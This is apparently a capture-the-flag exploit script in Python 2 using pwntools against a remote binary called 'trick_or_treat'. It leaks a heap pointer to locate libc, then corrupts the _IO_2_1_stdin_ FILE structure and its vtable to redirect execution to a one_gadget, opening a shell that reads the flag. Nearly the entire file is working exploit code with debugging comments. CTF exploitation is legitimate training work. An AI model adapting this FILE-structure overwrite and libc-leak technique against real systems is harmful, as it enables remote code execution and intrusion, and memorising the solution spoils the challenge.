import os
import struct
import sys
import subprocess
from pwn import *

REMOTE = True

if REMOTE:
    r = remote('3.112.41.140', 56746)
else:
    r = process('trick_or_treat', aslr=True)
    #gdb.attach(r)

r.sendlineafter("Size:", "12345678")
print r.recvuntil("Magic:")
magic = r.recvline()
magic = int(magic, 16)
print "malloced ptr: 0x%016x" % magic

libc_base = magic + 0xbc7000 - 0x10
one_gadget = libc_base + 0x4f322
#one_gadget = 0xbaadbeefbaadbeef

system = libc_base + (0x7f66356ac440 - 0x7f663565d000)

one_gadget = system
one_gadget = libc_base + 0x4f322

print "We want to execute: 0x%016x" % one_gadget

#svc_run = libc_base + (0x7f2279fdd450 - 0x7f2279e7f000)
#one_gadget = svc_run + 0x38 #call realloc

#one_gadget_chain = libc_base + 0x430ff
#one_gadget = one_gadget_chain

print "libc_base: 0x%016x" % libc_base

stdin = libc_base + 0x3EBA00
print "stdin: 0x%016x" % stdin
buf_base = stdin + 56
print "buf_base: 0x%016x" % buf_base

libc_got_target = magic - 0x7ffff6e1d010 + 0x7ffff7dcf048
#libc_got_target = libc_got_target + (0x130 - 0x048)
#libc_got_target = libc_got_target + 8
#libc_got_target = libc_got_target + 16 #-> abort (+8 is same as the previous)

print "libc_got_target = 0x%016x" % libc_got_target

target_1 = buf_base
value_1 = libc_got_target

#print "waiting... PID = %r" % r.pid
#raw_input()

r.sendlineafter("Offset & Value:", "0x%x 0x%x" % ((target_1 - magic) / 8, value_1))

print "waiting again..."
raw_input()

#now we are actually going to overflow libc from the GOT offset all the way to shortbuf

#0x84 is the offset of stdin->shortbuf
overflow_size = (stdin-libc_got_target) + 0x84
print "first overflow_size: 0x%08x" % overflow_size

#layout of _IO_2_1_stdin_:
'''
> p _IO_2_1_stdin_
$1 = {
  file = {
    _flags = -72540021,
    _IO_read_ptr = 0x7ff869a959f8 "1",
    _IO_read_end = 0x7ff869a96434 <main_arena+2036> "\370\177",
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x7ff869a95a00 <_IO_2_1_stdin_> "\213 \255", <incomplete sequence \373>,
    _IO_buf_end = 0x7ff869a95ae0 <_IO_wide_data_0> "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 16,
    _flags2 = -1,
    _old_offset = 4294967295,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x7ff869a978d0 <_IO_stdfile_0_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7ff869a95ae0 <_IO_wide_data_0>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = -1,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7ff869a922a0 <_IO_file_jumps>
}
'''

#print "waiting to start the 2nd loop write... PID = %r" % r.pid
#raw_input()

extra_bytes = 0
#NOT POSSIBLE!
#extra_bytes = 8

flag = 0x00000000fbad208b

fake_save_base = libc_base + 0x4f322
#fake_save_base = 0

#0xd8 is the offset to stdin->vtable, which normally points to IO_file_jumps
#read_ptr must be == read_end and it must be a meaningful ptr that contains a value byte valid for scanf. so we make it "1" (0x31)
overflow_data = ((stdin-8-libc_got_target)/8)*p64(one_gadget) + p64(0x31) + p64(flag) + p64(stdin-8) + p64(stdin-8-overflow_size) + p64(0)*4 + p64(stdin) + p64(stdin+0xd8+8+extra_bytes) + p64(fake_save_base) + (0x84-13*8)*"\x00" + p64(0) + p32(0x10) + p64(0xffffffffffffffff) + p32(0x0a000000)

assert(len(overflow_data) == overflow_size)

r.send(overflow_data)

#now we will trigger one more inchar() and because read_ptr == read_end, it will trigger underflow again, which will result in reading in 0xe0 bytes from actual stdin. this allows us to overwrite the vtable field, while again reassigning buf_base and buf_end the same way

vtable_value = 0xdeadbeeff00dface
vtable_value = 0

flag2 = libc_base + 0x4f322

print "desired flag2: 0x%016x" % flag2

fake_save_base = libc_base + 0x4f322
#fake_save_base = 0

overflow_size = 0xe0 + extra_bytes
#read_ptr == read_end can be anything more or less, but ideally it should be a value that makes sense for the scanf since we return that byte. so we make it stdin-8 and we have already written a meaningful thing there.
overflow_data = p64(flag2) + p64(stdin-8) + p64(stdin-8-0xe0) + p64(0)*4 + p64(stdin) + p64(stdin+0xd8+8) + p64(fake_save_base) + (0x84-13*8)*"\x00" + p64(0) + p32(0x10) + p64(0xffffffffffffffff) + p32(0) + (0xd8-0x84)*"\x00" + p64(vtable_value) + extra_bytes*"\x00"

assert(len(overflow_data) == overflow_size)

r.send(overflow_data)

#now we should be able to trigger a write the third time, thusly creating an RCE control situation. doesn't even matter so much what we write here, as the underflow trigger should immediately trigger a vtable abort, we don't even get to the read.

#these were of course totally useless because the flag was in /home/trick_or_treat/flag ... I took a huuuuuuuuge L on the time wasted on this. Oh well!
r.send("cat flag\n")
r.send("cat flag\n")

r.interactive()
